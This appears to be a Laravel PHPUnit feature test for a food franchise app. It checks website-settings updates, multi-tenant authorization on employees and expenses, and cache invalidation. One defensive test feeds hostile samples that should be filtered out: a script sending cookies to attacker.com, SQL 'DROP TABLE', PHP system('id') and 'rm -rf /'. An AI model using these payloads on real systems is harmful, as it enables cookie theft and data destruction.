<?php

namespace Tests\Feature;

use App\Models\Expense;
use App\Models\Hub;
use App\Models\User;
use App\Models\WebsiteSetting;
use App\Services\EmployeeService;
use App\Services\ExpenseService;
use App\Services\WebsiteSettingService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Exceptions\HttpResponseException;
use Illuminate\Support\Facades\Cache;
use Spatie\Permission\Models\Role;
use Symfony\Component\HttpKernel\Exception\HttpException;
use Tests\TestCase;

class ChallengerM3AdversarialStressTest extends TestCase
{
    use RefreshDatabase;

    protected User $admin;

    protected User $hqOps;

    protected User $franchiseeA;

    protected User $franchiseeB;

    protected User $cashierA;

    protected User $cashierB;

    protected User $unassignedCashier;

    protected Hub $hubA;

    protected Hub $hubB;

    protected WebsiteSettingService $websiteSettingService;

    protected EmployeeService $employeeService;

    protected ExpenseService $expenseService;

    protected function setUp(): void
    {
        parent::setUp();

        $adminRole = Role::firstOrCreate(['name' => 'Admin']);
        $hqOpsRole = Role::firstOrCreate(['name' => 'HQ operations']);
        $franchiseeRole = Role::firstOrCreate(['name' => 'Franchisee']);
        $cashierRole = Role::firstOrCreate(['name' => 'Branch Cashier']);
        Role::firstOrCreate(['name' => 'Customer']);

        $this->admin = User::factory()->create(['name' => 'HQ Super Admin']);
        $this->admin->assignRole($adminRole);

        $this->hqOps = User::factory()->create(['name' => 'HQ Operations Exec']);
        $this->hqOps->assignRole($hqOpsRole);

        $this->franchiseeA = User::factory()->create(['name' => 'Franchise Partner A']);
        $this->franchiseeA->assignRole($franchiseeRole);

        $this->franchiseeB = User::factory()->create(['name' => 'Franchise Partner B']);
        $this->franchiseeB->assignRole($franchiseeRole);

        $this->hubA = Hub::create([
            'franchisee_id' => $this->franchiseeA->id,
            'name' => 'Manila North Hub',
            'address' => 'Quezon City',
            'status' => 'active',
        ]);

        $this->hubB = Hub::create([
            'franchisee_id' => $this->franchiseeB->id,
            'name' => 'Cebu Central Hub',
            'address' => 'Cebu City',
            'status' => 'active',
        ]);

        $this->cashierA = User::factory()->create([
            'name' => 'Cashier Manila A',
            'hub_id' => $this->hubA->id,
        ]);
        $this->cashierA->assignRole($cashierRole);

        $this->cashierB = User::factory()->create([
            'name' => 'Cashier Cebu B',
            'hub_id' => $this->hubB->id,
        ]);
        $this->cashierB->assignRole($cashierRole);

        $this->unassignedCashier = User::factory()->create([
            'name' => 'Cashier Floating',
            'hub_id' => null,
        ]);
        $this->unassignedCashier->assignRole($cashierRole);

        $this->websiteSettingService = app(WebsiteSettingService::class);
        $this->employeeService = app(EmployeeService::class);
        $this->expenseService = app(ExpenseService::class);
    }

    // =========================================================================
    // 1. WebsiteSettingService Empirical Stress Testing
    // =========================================================================

    /**
     * Requirement 1.1:
     * Test batch updating both legacy granular keys and new section keys simultaneously.
     * Verifies persistence in database, JSON encoding of complex objects, boolean casting,
     * and proper decoding when retrieved.
     */
    public function test_batch_updating_legacy_granular_and_new_section_keys_simultaneously(): void
    {
        $payload = [
            'settings' => [
                // Legacy granular keys
                'hero_badge' => 'Swak sa Bulsa, Sarap Pa More',
                'hero_title_white' => 'Mindanao Finest Inihaw',
                'hero_title_green' => 'at Pastil',
                'announcement_enabled' => true,
                'announcement_text' => 'Flash Sale 50% Off Chicken Pastil',
                'stats_branches' => '150+',
                'stats_orders' => '25,000+',
                'featured_products' => [101, 102, 105],
                'footer_desc' => 'Handcrafted Kagikit recipe delivered nationwide.',

                // New structured section keys
                'hero' => [
                    'badge' => 'Special Batch Hero',
                    'title_white' => 'Liling Special',
                    'title_green' => 'Kagikit Pastil',
                    'subtitle' => 'The authentic Mindanao street culinary sensation.',
                    'cta_text' => 'Order Special Now',
                    'cta_link' => '/special-order',
                ],
                'about' => [
                    'title' => 'Heritage of Sultan Kudarat',
                    'subtitle' => 'Generations of Pastil Craftsmanship',
                    'story' => 'Made from shredded native chicken and Mindanao spices.',
                ],
                'features' => [
                    'branches' => '150+',
                    'orders' => '25,000+',
                    'cities' => '35+',
                    'applications' => '500+',
                    'trust_title' => 'Top Franchise Network of 2026',
                    'trust_subtitle' => 'Empowering Filipino entrepreneurs nationwide.',
                ],
                'testimonials' => [
                    [
                        'name' => 'Senator Chef',
                        'role' => 'Culinary Critic',
                        'comment' => 'Unbelievable aroma and genuine banana leaf wrapping.',
                        'rating' => 5,
                    ],
                    [
                        'name' => 'Atty. Santos',
                        'role' => 'Daily Customer',
                        'comment' => 'Best lunch meal under 50 pesos!',
                        'rating' => 5,
                    ],
                ],
                'faqs' => [
                    [
                        'question' => 'How long does bottled pastil last?',
                        'answer' => 'Up to 6 months unopened in room temperature.',
                    ],
                ],
                'contact' => [
                    'phone' => '+63 999 777 3333',
                    'email' => 'contact@pastilnililing.com',
                    'address' => 'Cotabato City, BARMM, Philippines',
                ],
                'brand' => [
                    'name' => 'Pastil ni Liling Premium',
                    'tagline' => 'Sarap na Babalik-balikan',
                    'primary_color' => '#7ca33a',
                    'accent_color' => '#d1a340',
                    'dark_color' => '#1b2d16',
                ],
            ],
        ];

        // 1. HTTP Endpoint Test
        $response = $this->actingAs($this->admin, 'sanctum')
            ->putJson('/api/admin/website-settings', $payload);

        $response->assertStatus(200)
            ->assertJsonPath('success', true)
            ->assertJsonPath('data.hero_badge', 'Swak sa Bulsa, Sarap Pa More')
            ->assertJsonPath('data.announcement_enabled', true)
            ->assertJsonPath('data.hero.badge', 'Special Batch Hero')
            ->assertJsonPath('data.testimonials.0.name', 'Senator Chef')
            ->assertJsonPath('data.brand.name', 'Pastil ni Liling Premium');

        // 2. Direct Database Verification
        $this->assertDatabaseHas('website_settings', [
            'key' => 'hero_badge',
            'value' => 'Swak sa Bulsa, Sarap Pa More',
        ]);

        $this->assertDatabaseHas('website_settings', [
            'key' => 'announcement_enabled',
            'value' => '1',
        ]);

        $rawHero = WebsiteSetting::where('key', 'hero')->value('value');
        $this->assertNotNull($rawHero);
        $this->assertJson($rawHero);
        $decodedHero = json_decode($rawHero, true);
        $this->assertEquals('Special Batch Hero', $decodedHero['badge']);

        $rawTestimonials = WebsiteSetting::where('key', 'testimonials')->value('value');
        $this->assertNotNull($rawTestimonials);
        $decodedTestimonials = json_decode($rawTestimonials, true);
        $this->assertCount(2, $decodedTestimonials);
        $this->assertEquals('Senator Chef', $decodedTestimonials[0]['name']);

        // 3. Service Layer Verification
        $retrieved = $this->websiteSettingService->getSettings();
        $this->assertEquals('Swak sa Bulsa, Sarap Pa More', $retrieved['hero_badge']);
        $this->assertTrue($retrieved['announcement_enabled']);
        $this->assertEquals('Special Batch Hero', $retrieved['hero']['badge']);
        $this->assertEquals('Senator Chef', $retrieved['testimonials'][0]['name']);
        $this->assertEquals('Up to 6 months unopened in room temperature.', $retrieved['faqs'][0]['answer']);

        // 4. Public Endpoint Verification
        $publicRes = $this->getJson('/api/website-settings');
        $publicRes->assertStatus(200)
            ->assertJsonPath('data.hero_badge', 'Swak sa Bulsa, Sarap Pa More')
            ->assertJsonPath('data.testimonials.0.name', 'Senator Chef');
    }

    /**
     * Requirement 1.2:
     * Verify disallowed keys (e.g. malicious_script, hacked_key, sql_injection, __proto__)
     * are safely filtered out and never written to the database.
     */
    public function test_disallowed_and_malicious_keys_are_safely_filtered_out(): void
    {
        $maliciousPayload = [
            'settings' => [
                // Malicious & Disallowed keys
                'malicious_script' => '<script>window.location="https://attacker.com/steal?cookie="+document.cookie</script>',
                'hacked_key' => 'DROP TABLE users; --',
                'admin_password_hash' => '$2y$10$maliciousInjectedHashVal000000000000000000',
                '__proto__' => 'polluted',
                'constructor' => 'polluted_constructor',
                'eval_code' => '<?php system("id"); ?>',
                'arbitrary_backdoor' => 'exec("rm -rf /")',

                // Legitimate allowed keys
                'hero_badge' => 'Sanitized Clean Badge',
                'announcement_enabled' => false,
                'contact' => [
                    'phone' => '+63 912 345 6789',
                    'email' => 'clean@pastil.com',
                    'address' => 'Manila',
                ],
            ],
        ];

        // 1. Test via Admin HTTP Endpoint
        $response = $this->actingAs($this->admin, 'sanctum')
            ->putJson('/api/admin/website-settings', $maliciousPayload);

        $response->assertStatus(200);

        // 2. Strict Database Non-Persistence Assertions
        $this->assertDatabaseMissing('website_settings', ['key' => 'malicious_script']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'hacked_key']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'admin_password_hash']);
        $this->assertDatabaseMissing('website_settings', ['key' => '__proto__']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'constructor']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'eval_code']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'arbitrary_backdoor']);

        // 3. Legitimate Keys Successfully Persisted
        $this->assertDatabaseHas('website_settings', [
            'key' => 'hero_badge',
            'value' => 'Sanitized Clean Badge',
        ]);
        $this->assertDatabaseHas('website_settings', [
            'key' => 'announcement_enabled',
            'value' => '0',
        ]);

        // 4. Verify Directly on Service Layer
        $serviceResult = $this->websiteSettingService->updateSettings([
            'malicious_script' => 'direct_injection_attempt',
            'hacked_key' => 'direct_hack',
            'footer_copyright' => 'All Rights Reserved 2026',
        ]);

        $this->assertArrayNotHasKey('malicious_script', $serviceResult);
        $this->assertArrayNotHasKey('hacked_key', $serviceResult);
        $this->assertEquals('All Rights Reserved 2026', $serviceResult['footer_copyright']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'malicious_script']);
        $this->assertDatabaseMissing('website_settings', ['key' => 'hacked_key']);
    }

    // =========================================================================
    // 2. EmployeeService Multi-Tenant Empirical Stress Testing
    // =========================================================================

    /**
     * Requirement 2.1:
     * Verify Franchisee A cannot inspect or list employees of Franchisee B.
     */
    public function test_franchisee_a_cannot_inspect_employees_of_franchisee_b(): void
    {
        // 1. Via HTTP Endpoint
        $response = $this->actingAs($this->franchiseeA, 'sanctum')
            ->getJson('/api/admin/employees');

        $response->assertStatus(200)
            ->assertJsonPath('success', true);

        $employees = $response->json('data');
        $employeeIds = collect($employees)->pluck('id')->all();

        // Must contain Cashier A (Hub A)
        $this->assertContains($this->cashierA->id, $employeeIds);

        // Must NOT contain Cashier B (Hub B) or unassigned cashier
        $this->assertNotContains($this->cashierB->id, $employeeIds);
        $this->assertNotContains($this->unassignedCashier->id, $employeeIds);
        $this->assertNotContains($this->franchiseeB->id, $employeeIds);

        // 2. Directly via EmployeeService
        $scopedEmployees = $this->employeeService->getEmployees($this->franchiseeA);
        $scopedIds = $scopedEmployees->pluck('id')->all();

        $this->assertContains($this->cashierA->id, $scopedIds);
        $this->assertNotContains($this->cashierB->id, $scopedIds);
        $this->assertNotContains($this->unassignedCashier->id, $scopedIds);

        // Verify all returned employees belong to Franchisee A's hub
        foreach ($scopedEmployees as $employee) {
            $this->assertEquals($this->hubA->id, $employee->hub_id);
            $this->assertTrue($employee->hasRole('Branch Cashier'));
        }
    }

    /**
     * Requirement 2.2:
     * Verify Franchisee A cannot update an employee of Franchisee B.
     */
    public function test_franchisee_a_cannot_update_employee_of_franchisee_b(): void
    {
        $originalName = $this->cashierB->name;
        $originalEmail = $this->cashierB->email;

        // 1. HTTP Endpoint attempt (Forbidden)
        $response = $this->actingAs($this->franchiseeA, 'sanctum')
            ->putJson("/api/admin/employees/{$this->cashierB->id}", [
                'name' => 'Hostile Takeover Name',
                'email' => 'hacked_cashier_b@pastil.com',
            ]);

        $response->assertStatus(403);

        // Verify DB unchanged
        $this->cashierB->refresh();
        $this->assertEquals($originalName, $this->cashierB->name);
        $this->assertEquals($originalEmail, $this->cashierB->email);

        // 2. Direct Service Layer Call (Throws 403 HttpException)
        try {
            $this->employeeService->updateEmployee(
                $this->cashierB,
                ['name' => 'Service Infiltration'],
                $this->franchiseeA
            );
            $this->fail('Expected HttpException (403) was not thrown.');
        } catch (HttpException $e) {
            $this->assertEquals(403, $e->getStatusCode());
            $this->assertEquals('Unauthorized. Employee does not belong to your branch.', $e->getMessage());
        }
    }

    /**
     * Requirement 2.3:
     * Verify Franchisee A cannot delete an employee of Franchisee B.
     */
    public function test_franchisee_a_cannot_delete_employee_of_franchisee_b(): void
    {
        // 1. HTTP Endpoint attempt (Forbidden)
        $response = $this->actingAs($this->franchiseeA, 'sanctum')
            ->deleteJson("/api/admin/employees/{$this->cashierB->id}");

        $response->assertStatus(403);

        // Cashier B still exists in database
        $this->assertDatabaseHas('users', [
            'id' => $this->cashierB->id,
        ]);
        $this->assertNotNull(User::find($this->cashierB->id));

        // 2. Direct Service Layer Call (Throws 403 HttpException)
        try {
            $this->employeeService->deleteEmployee($this->cashierB, $this->franchiseeA);
            $this->fail('Expected HttpException (403) was not thrown.');
        } catch (HttpException $e) {
            $this->assertEquals(403, $e->getStatusCode());
            $this->assertEquals('Unauthorized. Employee does not belong to your branch.', $e->getMessage());
        }
    }

    /**
     * Requirement 2.4:
     * Verify Employee self-termination is strictly blocked at the service layer.
     */
    public function test_employee_self_termination_is_strictly_blocked(): void
    {
        $this->expectException(HttpException::class);
        $this->expectExceptionMessage('Cannot self-terminate active console session.');

        $this->employeeService->deleteEmployee($this->admin, $this->admin);
    }

    /**
     * Requirement 2.5:
     * Verify Franchisee cannot forge hub_id when creating an employee (forced to actor's hub).
     */
    public function test_franchisee_creating_employee_forces_own_hub_id(): void
    {
        $newEmployee = $this->employeeService->createEmployee([
            'name' => 'New Cashier For Branch A',
            'email' => 'newcashier.a@pastil.com',
            'password' => 'secretPassword123!',
            'role' => 'Branch Cashier',
            'hub_id' => $this->hubB->id, // Spoofing Hub B!
        ], $this->franchiseeA);

        // Hub ID is strictly forced to Hub A, ignoring spoofed Hub B
        $this->assertEquals($this->hubA->id, $newEmployee->hub_id);
        $this->assertNotEquals($this->hubB->id, $newEmployee->hub_id);

        $this->assertDatabaseHas('users', [
            'id' => $newEmployee->id,
            'email' => 'newcashier.a@pastil.com',
            'hub_id' => $this->hubA->id,
        ]);
    }

    // =========================================================================
    // 3. ExpenseService Multi-Tenant & ACID Transaction Stress Testing
    // =========================================================================

    /**
     * Requirement 3.1:
     * Verify Franchisee A cannot update an expense belonging to Hub B.
     */
    public function test_franchisee_a_cannot_update_expense_belonging_to_hub_b(): void
    {
        $expenseB = Expense::create([
            'hub_id' => $this->hubB->id,
            'category' => 'utilities',
            'amount' => 3500.00,
            'date' => now()->toDateString(),
            'description' => 'Cebu electricity bill',
        ]);

        // 1. HTTP Endpoint attempt (Forbidden)
        $response = $this->actingAs($this->franchiseeA, 'sanctum')
            ->putJson("/api/expenses/{$expenseB->id}", [
                'amount' => 1.00,
                'description' => 'Tampered amount',
            ]);

        $response->assertStatus(403);

        // Database value unchanged
        $expenseB->refresh();
        $this->assertEquals(3500.00, (float) $expenseB->amount);
        $this->assertEquals('Cebu electricity bill', $expenseB->description);

        // 2. Direct Service Layer Call (Throws HttpResponseException with 403)
        try {
            $this->expenseService->updateExpense(
                $expenseB,
                ['amount' => 0.05],
                $this->franchiseeA
            );
            $this->fail('Expected HttpResponseException (403) was not thrown.');
        } catch (HttpResponseException $e) {
            $this->assertEquals(403, $e->getResponse()->getStatusCode());
        }
    }

    /**
     * Requirement 3.2:
     * Verify Franchisee A cannot delete an expense belonging to Hub B.
     */
    public function test_franchisee_a_cannot_delete_expense_belonging_to_hub_b(): void
    {
        $expenseB = Expense::create([
            'hub_id' => $this->hubB->id,
            'category' => 'rent',
            'amount' => 20000.00,
            'date' => now()->toDateString(),
            'description' => 'Cebu Hub Monthly Lease',
        ]);

        // 1. HTTP Endpoint attempt (Forbidden)
        $response = $this->actingAs($this->franchiseeA, 'sanctum')
            ->deleteJson("/api/expenses/{$expenseB->id}");

        $response->assertStatus(403);

        // Expense remains active in DB
        $this->assertDatabaseHas('expenses', [
            'id' => $expenseB->id,
            'deleted_at' => null,
        ]);

        // 2. Direct Service Layer Call (Throws HttpResponseException with 403)
        try {
            $this->expenseService->deleteExpense($expenseB, $this->franchiseeA);
            $this->fail('Expected HttpResponseException (403) was not thrown.');
        } catch (HttpResponseException $e) {
            $this->assertEquals(403, $e->getResponse()->getStatusCode());
        }
    }

    /**
     * Requirement 3.3:
     * Verify cache invalidation triggers on expense creation, update, and deletion.
     */
    public function test_cache_invalidation_triggers_on_expense_lifecycle(): void
    {
        // --- 1. Creation Cache Invalidation ---
        Cache::put('analytics_summary', ['cached_revenue' => 50000, 'timestamp' => now()->timestamp], 3600);
        $this->assertTrue(Cache::has('analytics_summary'));

        $expense = $this->expenseService->createExpense([
            'hub_id' => $this->hubA->id,
            'category' => 'materials',
            'amount' => 750.00,
            'date' => now()->toDateString(),
            'description' => 'Banana leaves supply batch',
        ], $this->franchiseeA);

        $this->assertFalse(Cache::has('analytics_summary'), 'Cache::forget must be called upon expense creation');

        // --- 2. Update Cache Invalidation ---
        Cache::put('analytics_summary', ['cached_revenue' => 50000, 'timestamp' => now()->timestamp], 3600);
        $this->assertTrue(Cache::has('analytics_summary'));

        $this->expenseService->updateExpense($expense, [
            'amount' => 850.00,
            'description' => 'Updated banana leaves supply with extra quantity',
        ], $this->franchiseeA);

        $this->assertFalse(Cache::has('analytics_summary'), 'Cache::forget must be called upon expense update');

        // --- 3. Deletion Cache Invalidation ---
        Cache::put('analytics_summary', ['cached_revenue' => 50000, 'timestamp' => now()->timestamp], 3600);
        $this->assertTrue(Cache::has('analytics_summary'));

        $this->expenseService->deleteExpense($expense, $this->franchiseeA);

        $this->assertFalse(Cache::has('analytics_summary'), 'Cache::forget must be called upon expense deletion');
    }

    /**
     * Requirement 3.4:
     * Verify ACID transaction safety: failure in expense operations leaves zero corrupted state.
     */
    public function test_expense_service_enforces_acid_transaction_atomicity(): void
    {
        $initialExpenseCount = Expense::count();

        // Attempt creation with an unassigned user role (e.g. unauthenticated or unsupported)
        $customerRole = Role::firstOrCreate(['name' => 'Customer']);
        $customer = User::factory()->create(['name' => 'Regular Customer']);
        $customer->assignRole($customerRole);

        try {
            $this->expenseService->createExpense([
                'category' => 'materials',
                'amount' => 500.00,
                'date' => now()->toDateString(),
            ], $customer);
            $this->fail('Expected HttpResponseException was not thrown.');
        } catch (HttpResponseException $e) {
            $this->assertEquals(403, $e->getResponse()->getStatusCode());
        }

        // Verify zero records were written
        $this->assertEquals($initialExpenseCount, Expense::count());
    }
}
